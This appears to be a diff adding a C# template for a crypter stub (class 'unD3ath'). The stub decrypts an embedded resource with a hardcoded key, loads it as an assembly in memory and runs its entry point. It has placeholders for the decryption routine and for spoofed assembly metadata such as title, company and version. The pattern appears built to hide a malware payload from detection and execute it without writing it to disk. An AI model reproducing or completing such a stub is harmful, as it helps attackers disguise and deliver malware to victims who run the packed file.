@@ -1,0 +1,38 @@
+    using System;
+	using System.IO;
+    using System.Diagnostics;
+    using System.Windows.Forms;
+	using System.Security.Cryptography;
+	using System.Text;  
+	using System.Resources;
+	using System.Reflection;
+
+
+//|[assembly: AssemblyTitle("title")]
+//|[assembly: AssemblyDescription("description")]
+//|[assembly: AssemblyCompany("company")]               
+//|[assembly: AssemblyProduct("product")]
+//|[assembly: AssemblyCopyright("copyright")]
+//|[assembly: AssemblyTrademark("trademark")]
+//|[assembly: AssemblyFileVersion("filevers")]
+    
+     
+    class unD3ath
+    {
+    static void Main()
+    {
+
+    ResourceManager ma = new ResourceManager("res",System.Reflection.Assembly.GetExecutingAssembly());
+    ma.ReleaseAllResources();
+	System.Reflection.Assembly.Load([[]]((byte[])ma.GetObject("file"), "{und3ath}")).EntryPoint.Invoke(null, null);
+
+    
+    }
+
+
+   [ENCRYPTION]
+
+		
+
+
+    }
